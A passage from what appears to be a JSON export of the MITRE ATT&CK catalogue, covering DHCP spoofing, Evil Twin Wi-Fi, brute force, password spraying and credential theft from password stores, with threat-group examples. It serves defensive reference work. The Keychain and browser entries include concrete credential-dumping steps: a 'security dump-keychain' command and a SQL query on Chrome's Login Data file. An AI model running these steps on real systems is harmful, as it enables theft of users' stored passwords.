This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.", "detailed_description": "Adversaries may redirect network traffic to adversary-owned systems by spoofing Dynamic Host Configuration Protocol (DHCP) traffic and acting as a malicious DHCP server on the victim network. By achieving the adversary-in-the-middle (AiTM) position, adversaries may collect network communications, including passed credentials, especially those sent over insecure, unencrypted protocols. This may also enable follow-on behaviors such as Network Sniffing or Transmitted Data Manipulation.\nDHCP is based on a client-server model and has two functionalities: a protocol for providing network configuration settings from a DHCP server to a client and a mechanism for allocating network addresses to clients. The typical server-client interaction is as follows:\nThe client broadcasts a DISCOVER message.\nThe server responds with an OFFER message, which includes an available network address.\nThe client broadcasts a REQUEST message, which includes the network address offered.\nThe server acknowledges with an ACK message and the client receives the network configuration parameters.\nAdversaries may spoof as a rogue DHCP server on the victim network, from which legitimate hosts may receive malicious network configurations. For example, malware can act as a DHCP server and provide adversary-owned DNS servers to the victimized computers. Through the malicious network configurations, an adversary may achieve the AiTM position, route client traffic through adversary-controlled systems, and collect information from the client network.\nDHCPv6 clients can receive network configuration information without being assigned an IP address by sending a INFORMATION-REQUEST (code 11) message to the All_DHCP_Relay_Agents_and_Servers multicast address. Adversaries may use their rogue DHCP server to respond to this request message with malicious network configurations.\nRather than establishing an AiTM position, adversaries may also abuse DHCP spoofing to perform a DHCP exhaustion attack (i.e, Service Exhaustion Flood) by generating many broadcast DISCOVER messages to exhaust a network\u2019s DHCP allocation pool.", "id": "T1557.003", "examples": []}, {"name": "Evil Twin", "description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or Input Capture.", "detailed_description": "Adversaries may host seemingly genuine Wi-Fi access points to deceive users into connecting to malicious networks as a way of supporting follow-on behaviors such as Network Sniffing, Transmitted Data Manipulation, or Input Capture.\nBy using a Service Set Identifier (SSID) of a legitimate Wi-Fi network, fraudulent Wi-Fi access points may trick devices or users into connecting to malicious Wi-Fi networks.  Adversaries may provide a stronger signal strength or block access to Wi-Fi access points to coerce or entice victim devices into connecting to malicious networks.  A Wi-Fi Pineapple \u2013 a network security auditing and penetration testing tool \u2013 may be deployed in Evil Twin attacks for ease of use and broader range. Custom certificates may be used in an attempt to intercept HTTPS traffic.\nSimilarly, adversaries may also listen for client devices sending probe requests for known or previously connected networks (Preferred Network Lists or PNLs). When a malicious access point receives a probe request, adversaries can respond with the same SSID to imitate the trusted, known network.  Victim devices are led to believe the responding access point is from their PNL and initiate a connection to the fraudulent network.\nUpon logging into the malicious Wi-Fi access point, a user may be directed to a fake login page or captive portal webpage to capture the victim\u2019s credentials. Once a user is logged into the fraudulent Wi-Fi network, the adversary may able to monitor network activity, manipulate data, or steal additional credentials. Locations with high concentrations of public Wi-Fi access, such as airports, coffee shops, or libraries, may be targets for adversaries to set up illegitimate Wi-Fi access points.", "id": "T1557.004", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used a Wi-Fi Pineapple to set up Evil Twin Wi-Fi Poisoning for the purposes of capturing victim credentials or planting espionage-oriented malware."}]}]}, {"name": "Brute Force", "description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.", "detailed_description": "Adversaries may use brute force techniques to gain access to accounts when passwords are unknown or when password hashes are obtained. Without knowledge of the password for an account or set of accounts, an adversary may systematically guess the password using a repetitive or iterative mechanism. Brute forcing passwords can take place via interaction with a service that will check the validity of those credentials or offline against previously acquired credential data, such as password hashes.\nBrute forcing credentials may take place at various points during a breach. For example, adversaries may attempt to brute force access to Valid Accounts within a victim environment leveraging knowledge gathered from other post-compromise behaviors such as OS Credential Dumping, Account Discovery, or Password Policy Discovery. Adversaries may also combine brute forcing activity with behaviors such as External Remote Services as part of Initial Access.", "id": "T1110", "examples": [{"id": "C0025", "name": "2016 Ukraine Electric Power Attack", "description": "During the 2016 Ukraine Electric Power Attack, Sandworm Team used a script to attempt RPC authentication against a number of hosts."}, {"id": "G1030", "name": "Agrius", "description": "Agrius engaged in various brute forcing activities via SMB in victim environments."}, {"id": "G0007", "name": "APT28", "description": "APT28 can perform brute force attacks to obtain credentials."}, {"id": "G0082", "name": "APT38", "description": "APT38 has used brute force techniques to attempt account access when passwords are unknown or when password hashes are unavailable."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used Ncrack to reveal credentials."}, {"id": "G0096", "name": "APT41", "description": "APT41 performed password brute-force attacks on the local admin account."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell has a module to perform brute force attacks on a system."}, {"id": "S0220", "name": "Chaos", "description": "Chaos conducts brute force attacks against SSH services to gain initial access."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can brute force supplied user credentials across a network range."}, {"id": "G0105", "name": "DarkVishnya", "description": "DarkVishnya used brute-force attack to obtain login data."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has attempted to brute force credentials to gain access."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear used the su-bruteforce tool to brute force specific users using the su command."}, {"id": "G0053", "name": "FIN5", "description": "FIN5 has has used the tool GET2 Penetrator to look for remote login and hard-coded credentials."}, {"id": "G0117", "name": "Fox Kitten", "description": "Fox Kitten has brute forced RDP credentials."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used brute force attacks to compromise valid credentials."}, {"id": "S0599", "name": "Kinsing", "description": "Kinsing has attempted to brute force hosts over SSH."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used brute force techniques to obtain credentials."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group performed brute force attacks against administrator accounts."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 has modules for brute forcing local administrator and AD user accounts."}, {"id": "S0583", "name": "Pysa", "description": "Pysa has used brute force attempts against a central management console, as well as some Active Directory accounts."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can conduct brute force attacks to capture credentials."}, {"id": "G0010", "name": "Turla", "description": "Turla may attempt to connect to systems within a victim's network using net use commands and a predefined list or collection of passwords."}], "sub_techniques": [{"name": "Password Guessing", "description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.", "detailed_description": "Adversaries with no prior knowledge of legitimate credentials within the system or environment may guess passwords to attempt access to accounts. Without knowledge of the password for an account, an adversary may opt to systematically guess the password using a repetitive or iterative mechanism. An adversary may guess login credentials without prior knowledge of system or environment passwords during an operation by using a list of common passwords. Password guessing may or may not take into account the target's policies on password complexity or use policies that may lock accounts out after a number of failed attempts.\nGuessing passwords can be a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\nTypically, management services over commonly used ports are used when guessing passwords. Commonly targeted services include the following:\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.. Further, adversaries may abuse network device interfaces (such as wlanAPI) to brute force accessible wifi-router(s) via wireless authentication protocols.\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.", "id": "T1110.001", "examples": [{"id": "G0007", "name": "APT28", "description": "APT28 has used a brute-force/password-spray tooling that operated in two modes: in brute-force mode it typically sent over 300 authentication attempts per hour per targeted account over the course of several hours or days. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password guessing attacks."}, {"id": "G0016", "name": "APT29", "description": "APT29 has successfully conducted password guessing attacks against a list of mailboxes."}, {"id": "S0020", "name": "China Chopper", "description": "China Chopper's server component can perform brute force password guessing against authentication portals."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can brute force passwords for a specified user on a single target system or across an entire network."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed using a hard coded list of passwords to brute force user accounts. "}, {"id": "S0698", "name": "HermeticWizard", "description": "HermeticWizard can use a list of hardcoded credentials in attempt to authenticate to SMB shares."}, {"id": "S0532", "name": "Lucifer", "description": "Lucifer has attempted to brute force TCP ports 135 (RPC) and 1433 (MSSQL) with the default username or list of usernames and    passwords."}, {"id": "S0598", "name": "P.A.S. Webshell", "description": "P.A.S. Webshell can use predefined users and passwords to execute brute force attacks against SSH, FTP, POP3, MySQL, MSSQL, and PostgreSQL services."}, {"id": "S0453", "name": "Pony", "description": "Pony has used a small dictionary of common passwords against a collected list of local accounts."}, {"id": "S0374", "name": "SpeakUp", "description": "SpeakUp can perform brute forcing using a pre-defined list of usernames and passwords in an attempt to log in to administrative panels. "}, {"id": "S0341", "name": "Xbash", "description": "Xbash can obtain a list of weak passwords from the C2 server to use for brute forcing as well as attempt to brute force services with open ports."}]}, {"name": "Password Cracking", "description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further,  adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices.", "detailed_description": "Adversaries may use password cracking to attempt to recover usable credentials, such as plaintext passwords, when credential material such as password hashes are obtained. OS Credential Dumping can be used to obtain password hashes, this may only get an adversary so far when Pass the Hash is not an option. Further,  adversaries may leverage Data from Configuration Repository in order to obtain hashed credentials for network devices.\nTechniques to systematically guess the passwords used to compute hashes are available, or the adversary may use a pre-computed rainbow table to crack hashes. Cracking hashes is usually done on adversary-controlled systems outside of the target network. The resulting plaintext password resulting from a successfully cracked hash may be used to log into systems, resources, and services in which the account has access.", "id": "T1110.002", "examples": [{"id": "G0022", "name": "APT3", "description": "APT3 has been known to brute force password hashes to be able to leverage plain text credentials."}, {"id": "G0035", "name": "Dragonfly", "description": "Dragonfly has dropped and executed tools used for password cracking, including Hydra and CrackMapExec."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has extracted password hashes from ntds.dit to crack offline."}, {"id": "S0056", "name": "Net Crawler", "description": "Net Crawler uses a list of known credentials gathered through credential dumping to guess passwords to accounts as it spreads throughout a network."}, {"id": "C0002", "name": "Night Dragon", "description": "During Night Dragon, threat actors used Cain & Abel to crack password hashes."}]}, {"name": "Password Spraying", "description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. ", "detailed_description": "Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Password spraying uses one password (e.g. 'Password01'), or a small list of commonly used passwords, that may match the complexity policy of the domain. Logins are attempted with that password against many different accounts on a network to avoid account lockouts that would normally occur when brute forcing a single account with many passwords. \nTypically, management services over commonly used ports are used when password spraying. Commonly targeted services include the following:\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.\nIn default environments, LDAP and Kerberos connection attempts are less likely to trigger events over SMB, which creates Windows \"logon failure\" event ID 4625.", "id": "T1110.003", "examples": [{"id": "G1030", "name": "Agrius", "description": "Agrius engaged in password spraying via SMB in victim environments."}, {"id": "G0007", "name": "APT28", "description": "APT28 has used a brute-force/password-spray tooling that operated in two modes: in password-spraying mode it conducted approximately four authentication attempts per hour per targeted account over the course of several days or weeks. APT28 has also used a Kubernetes cluster to conduct distributed, large-scale password spray attacks."}, {"id": "G0016", "name": "APT29", "description": "APT29 has conducted brute force password spray attacks."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used password spraying to gain access to target systems."}, {"id": "S0606", "name": "Bad Rabbit", "description": "Bad Rabbit\u2019s infpub.dat file uses NTLM login credentials to brute force Windows machines."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used multiple password spraying attacks against victim's remote services to obtain valid user and administrator accounts."}, {"id": "S0488", "name": "CrackMapExec", "description": "CrackMapExec can brute force credential authentication by using a supplied list of usernames and a single password."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has conducted password spraying against Outlook Web Access (OWA) infrastructure to identify valid user names and passwords."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used password spraying attacks to obtain valid credentials."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware attempts to connect to Windows shares for lateral movement by using a generated list of usernames, which center around permutations of the username Administrator, and weak passwords."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used a tool called Total SMB BruteForcer to perform internal password spraying."}, {"id": "S0362", "name": "Linux Rabbit", "description": "Linux Rabbit brute forces SSH passwords in order to attempt to gain access and install its malware onto the server. "}, {"id": "S0413", "name": "MailSniper", "description": "MailSniper can be used for password spraying against Exchange and Office 365."}, {"id": "G0122", "name": "Silent Librarian", "description": "Silent Librarian has used collected lists of names and e-mail accounts to use in password spraying attacks against private sector targets."}]}, {"name": "Credential Stuffing", "description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.", "detailed_description": "Adversaries may use credentials obtained from breach dumps of unrelated accounts to gain access to target accounts through credential overlap. Occasionally, large numbers of username and password pairs are dumped online when a website or service is compromised and the user account credentials accessed. The information may be useful to an adversary attempting to compromise accounts by taking advantage of the tendency for users to use the same passwords across personal and business accounts.\nCredential stuffing is a risky option because it could cause numerous authentication failures and account lockouts, depending on the organization's login failure policies.\nTypically, management services over commonly used ports are used when stuffing credentials. Commonly targeted services include the following:\nIn addition to management services, adversaries may \"target single sign-on (SSO) and cloud-based applications utilizing federated authentication protocols,\" as well as externally facing email applications, such as Office 365.", "id": "T1110.004", "examples": [{"id": "G0114", "name": "Chimera", "description": "Chimera has used credential stuffing against victim's remote services to obtain valid accounts."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot uses brute-force attack against RDP with rdpscanDll module."}]}]}, {"name": "Credentials from Password Stores", "description": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.", "detailed_description": "Adversaries may search for common password storage locations to obtain user credentials. Passwords are stored in several places on a system, depending on the operating system or application holding the credentials. There are also specific applications and services that store passwords to make them easier for users to manage and maintain, such as password managers and cloud secrets vaults. Once credentials are obtained, they can be used to perform lateral movement and access restricted information.", "id": "T1555", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla has the ability to steal credentials from FTP clients and wireless profiles."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like LaZagne to gather credentials."}, {"id": "G0087", "name": "APT39", "description": "APT39 has used the Smartftp Password Decryptor tool to decrypt FTP passwords."}, {"id": "G0096", "name": "APT41", "description": "APT41 has obtained information about accounts, lists of employees, and plaintext and hashed passwords from databases."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth uses an external software known as NetPass to recover passwords. "}, {"id": "S0484", "name": "Carberp", "description": "Carberp's passw.plug plugin can gather account information from multiple instant messaging, email, and social media services, as well as FTP, VNC, and VPN clients."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke collects user credentials, including passwords, for various programs including popular instant messaging applications and email clients as well as WLAN keys."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate use Nirsoft Network Password Recovery or NetPass tools to steal stored RDP credentials in some malware versions."}, {"id": "G0120", "name": "Evilnum", "description": "Evilnum can collect email credentials from victims."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used the Stealer One credential stealer to target e-mail and file transfer utilities including FTP."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has run cmdkey on victim machines to identify stored credentials."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can collect credentials from WINSCP."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can obtain credentials from databases, mail, and WiFi across multiple platforms."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used several tools for retrieving login and password information, including LaZagne."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has stolen credentials from multiple applications and data sources including Windows OS credentials, email clients, FTP, and SFTP clients."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has obtained credentials from mail clients via NirSoft MailPassView."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka extracts credentials from the Windows Registry associated with Premiumsoft Navicat, a utility used to facilitate access to various database types."}, {"id": "S0167", "name": "Matryoshka", "description": "Matryoshka is capable of stealing Outlook passwords."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for stealing stored credentials from Outlook and Foxmail email client software."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from the credential vault and DPAPI."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu has obtained credentials from mail clients via NirSoft MailPassView."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE can retrieve passwords from messaging and mail client applications."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access."}, {"id": "S0138", "name": "OLDBAIT", "description": "OLDBAIT collects credentials from several email clients."}, {"id": "S0048", "name": "PinchDuke", "description": "PinchDuke steals credentials from compromised hosts. PinchDuke's credential stealing functionality is believed to be based on the source code of the Pinch credential stealing malware (also known as LdPinch). Credentials targeted by PinchDuke include ones associated with many sources such as The Bat!, Yahoo!, Mail.ru, Passport.Net, Google Talk, and Microsoft Outlook."}, {"id": "S0435", "name": "PLEAD", "description": "PLEAD has the ability to steal saved passwords from Microsoft Outlook."}, {"id": "S0378", "name": "PoshC2", "description": "PoshC2 can decrypt passwords stored in the RDCMan configuration file."}, {"id": "S0113", "name": "Prikormka", "description": "A module in Prikormka collects passwords stored in applications installed on the victim."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can use Lazagne for harvesting credentials."}, {"id": "S0262", "name": "QuasarRAT", "description": "QuasarRAT can obtain passwords from common FTP clients."}, {"id": "C0024", "name": "SolarWinds Compromise", "description": "During the SolarWinds Compromise, APT29 used account credentials they obtained to attempt access to Group Managed Service Account (gMSA) passwords."}, {"id": "G0038", "name": "Stealth Falcon", "description": "Stealth Falcon malware gathers passwords from multiple sources, including Windows Credential Vault and Outlook."}, {"id": "G1017", "name": "Volt Typhoon", "description": "Volt Typhoon has attempted to obtain credentials from OpenSSH, realvnc, and PuTTY."}], "sub_techniques": [{"name": "Keychain", "description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service.", "detailed_description": "Adversaries may acquire credentials from Keychain. Keychain (or Keychain Services) is the macOS credential management system that stores account names, passwords, private keys, certificates, sensitive application data, payment data, and secure notes. There are three types of Keychains: Login Keychain, System Keychain, and Local Items (iCloud) Keychain. The default Keychain is the Login Keychain, which stores user passwords and information. The System Keychain stores items accessed by the operating system, such as items shared among users on a host. The Local Items (iCloud) Keychain is used for items synced with Apple\u2019s iCloud service.\nKeychains can be viewed and edited through the Keychain Access application or using the command-line utility security. Keychain files are located in ~/Library/Keychains/, /Library/Keychains/, and /Network/Library/Keychains/.\nAdversaries may gather user credentials from Keychain storage/memory. For example, the command security dump-keychain \u2013d will dump all Login Keychain credentials from ~/Library/Keychains/login.keychain-db. Adversaries may also directly read Login Keychain credentials from the ~/Library/Keychains/login.keychain file. Both methods require a password, where the default password for the Login Keychain is the current user\u2019s password to login to the macOS host.", "id": "T1555.001", "examples": [{"id": "S0274", "name": "Calisto", "description": "Calisto collects Keychain storage data and copies those passwords/tokens to a file."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can capture files from a targeted user's keychain directory."}, {"id": "S0690", "name": "Green Lambert", "description": "Green Lambert can use Keychain Services API functions to find and collect passwords, such as SecKeychainFindInternetPassword and SecKeychainItemCopyAttributesAndData."}, {"id": "S0278", "name": "iKitten", "description": "iKitten collects the keychains on the system."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can obtain credentials from macOS Keychains."}, {"id": "S1016", "name": "MacMa", "description": "MacMa can dump credentials from the macOS keychain."}, {"id": "S0279", "name": "Proton", "description": "Proton gathers credentials in files for keychains."}]}, {"name": "Securityd Memory", "description": "An adversary with root access may gather credentials by reading securityd\u2019s memory. securityd is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through securityd's memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.", "detailed_description": "An adversary with root access may gather credentials by reading securityd\u2019s memory. securityd is a service/daemon responsible for implementing security protocols such as encryption and authorization. A privileged adversary may be able to scan through securityd's memory to find the correct sequence of keys to decrypt the user\u2019s logon keychain. This may provide the adversary with various plaintext passwords, such as those for users, WiFi, mail, browsers, certificates, secure notes, etc.\nIn OS X prior to El Capitan, users with root access can read plaintext keychain passwords of logged-in users because Apple\u2019s keychain implementation allows these credentials to be cached so that users are not repeatedly prompted for passwords. Apple\u2019s securityd utility takes the user\u2019s logon password, encrypts it with PBKDF2, and stores this master key in memory. Apple also uses a set of keys and algorithms to encrypt the user\u2019s password, but once the master key is found, an adversary need only iterate over the other values to unlock the final password.", "id": "T1555.002", "examples": [{"id": "S0276", "name": "Keydnap", "description": "Keydnap uses the keychaindump project to read securityd memory."}]}, {"name": "Credentials from Web Browsers", "description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.", "detailed_description": "Adversaries may acquire credentials from web browsers by reading files specific to the target browser. Web browsers commonly save credentials such as website usernames and passwords so that they do not need to be entered manually in the future. Web browsers typically store the credentials in an encrypted format within a credential store; however, methods exist to extract plaintext credentials from web browsers.\nFor example, on Windows systems, encrypted credentials may be obtained from Google Chrome by reading a database file, AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data and executing a SQL query: SELECT action_url, username_value, password_value FROM logins;. The plaintext password can then be obtained by passing the encrypted credentials to the Windows API function CryptUnprotectData, which uses the victim\u2019s cached logon credentials as the decryption key.\nAdversaries have executed similar procedures for common web browsers such as FireFox, Safari, Edge, etc. Windows stores Internet Explorer and Microsoft Edge credentials in Credential Lockers managed by the Windows Credential Manager.\nAdversaries may also acquire credentials by searching web browser process memory for patterns that commonly match credentials.\nAfter acquiring credentials from web browsers, adversaries may attempt to recycle the credentials across different systems and/or accounts in order to expand access. This can result in significantly furthering an adversary's objective in cases where credentials gained from web browsers overlap with privileged accounts (e.g. domain administrator).", "id": "T1555.003", "examples": [{"id": "S0331", "name": "Agent Tesla", "description": "Agent Tesla can gather credentials from a number of browsers."}, {"id": "G0130", "name": "Ajax Security Team", "description": "Ajax Security Team has used FireMalv custom-developed malware, which collected passwords from the Firefox browser storage."}, {"id": "G0022", "name": "APT3", "description": "APT3 has used tools to dump passwords from browsers."}, {"id": "G0064", "name": "APT33", "description": "APT33 has used a variety of publicly available tools like LaZagne to gather credentials."}, {"id": "G0067", "name": "APT37", "description": "APT37 has used a credential stealer known as ZUMKONG that can harvest usernames and passwords stored in browsers."}, {"id": "G0096", "name": "APT41", "description": "APT41 used BrowserGhost, a tool designed to obtain credentials from browsers, to retrieve information from password stores."}, {"id": "S0344", "name": "Azorult", "description": "Azorult can steal credentials from the victim's browser."}, {"id": "S0093", "name": "Backdoor.Oldrea", "description": "Some Backdoor.Oldrea samples contain a publicly available Web browser password recovery tool."}, {"id": "S0089", "name": "BlackEnergy", "description": "BlackEnergy has used a plug-in to gather credentials from web browsers including FireFox, Google Chrome, and Internet Explorer."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT can collect passwords stored in web browers, including Internet Explorer, Edge, Chrome, and Naver Whale."}, {"id": "S0484", "name": "Carberp", "description": "Carberp's passw.plug plugin can gather passwords saved in Opera, Internet Explorer, Safari, Firefox, and Chrome."}, {"id": "S0631", "name": "Chaes", "description": "Chaes can steal login credentials and stored financial information from the browser."}, {"id": "S0144", "name": "ChChes", "description": "ChChes steals credentials stored inside Internet Explorer."}, {"id": "S0492", "name": "CookieMiner", "description": "CookieMiner can steal saved usernames and passwords in Chrome as well as credit card credentials."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke collects user credentials, including passwords, for various programs including Web browsers."}, {"id": "S0115", "name": "Crimson", "description": "Crimson contains a module to steal credentials from Web browsers on the victim machine."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has been observed dropping browser password grabber modules. "}, {"id": "S0363", "name": "Empire", "description": "Empire can use modules that extract passwords from common web browsers such as Firefox and Chrome."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has used the Stealer One credential stealer to target web browsers."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can steal cookie data and credentials from Google Chrome."}, {"id": "S0132", "name": "H1N1", "description": "H1N1 dumps usernames and passwords from Firefox, Internet Explorer, and Outlook."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used a Mimikatz-based tool and a PowerShell script to steal passwords from Google Chrome."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has a PasswordRecoveryPacket module for recovering browser passwords."}, {"id": "G0100", "name": "Inception", "description": "Inception used a browser plugin to steal passwords and sessions from Internet Explorer, Chrome, Opera, Firefox, Torch, and Yandex."}, {"id": "S0528", "name": "Javali", "description": "Javali can capture login credentials from open browsers including Firefox, Chrome, Internet Explorer, and Edge."}, {"id": "S0283", "name": "jRAT", "description": "jRAT can capture passwords from common web browsers such as Internet Explorer, Google Chrome, and Firefox."}, {"id": "S0387", "name": "KeyBoy", "description": "KeyBoy attempts to collect passwords from browsers."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY has the ability to steal data from the Chrome, Edge, Firefox, Thunderbird, and Opera browsers."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has used browser extensions including Google Chrome to steal passwords and cookies from browsers. Kimsuky has also used Nirsoft's WebBrowserPassView tool to dump the passwords obtained from victims."}, {"id": "S0356", "name": "KONNI", "description": "KONNI can steal profiles (containing credential information) from Firefox, Chrome, and Opera."}, {"id": "G1004", "name": "LAPSUS$", "description": "LAPSUS$ has obtained passwords and session tokens with the use of the Redline password stealer."}, {"id": "S0349", "name": "LaZagne", "description": "LaZagne can obtain credentials from web browsers such as Google Chrome, Internet Explorer, and Firefox."}, {"id": "G0077", "name": "Leafminer", "description": "Leafminer used several tools for retrieving login and password information, including LaZagne."}, {"id": "S0681", "name": "Lizar", "description": "Lizar has a module to collect usernames and passwords stored in browsers."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has demonstrated the ability to steal credentials from multiple applications and data sources including Safari and the Chromium and Mozilla Firefox-based web browsers."}, {"id": "S0409", "name": "Machete", "description": "Machete collects stored credentials from several web browsers."}, {"id": "G1026", "name": "Malteiro", "description": "Malteiro has stolen credentials stored in the victim\u2019s browsers via software tool NirSoft WebBrowserPassView."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka gathers credentials from Chromium-based browsers."}, {"id": "S0530", "name": "Melcoz", "description": "Melcoz has the ability to steal credentials from web browsers."}, {"id": "S1146", "name": "MgBot", "description": "MgBot includes modules for stealing credentials from various browsers and applications, including Chrome, Opera, Firefox, Foxmail, QQBrowser, FileZilla, and WinSCP."}, {"id": "S0002", "name": "Mimikatz", "description": "Mimikatz performs credential dumping to obtain account and password information useful in gaining access to additional systems and enterprise network resources. It contains functionality to acquire information about credentials in many ways, including from DPAPI."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can steal credentials from Google Chrome."}, {"id": "G0021", "name": "Molerats", "description": "Molerats used the public tool BrowserPasswordDump10 to dump passwords saved in browsers on victims."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers."}, {"id": "S0198", "name": "NETWIRE", "description": "NETWIRE has the ability to steal credentials from web browsers including Internet Explorer, Opera, Yandex, and Chrome."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has a module that steals passwords saved in victim web browsers."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has used credential dumping tools such as LaZagne to steal credentials to accounts logged into the compromised system and to Outlook Web Access. OilRig has also used tool named PICKPOCKET to dump passwords from web browsers."}, {"id": "S0138", "name": "OLDBAIT", "description": "OLDBAIT collects credentials from Internet Explorer, Mozilla Firefox, and Eudora."}, {"id": "S0365", "name": "Olympic Destroyer", "description": "Olympic Destroyer contains a module that tries to obtain stored credentials from web browsers."}, {"id": "G0040", "name": "Patchwork", 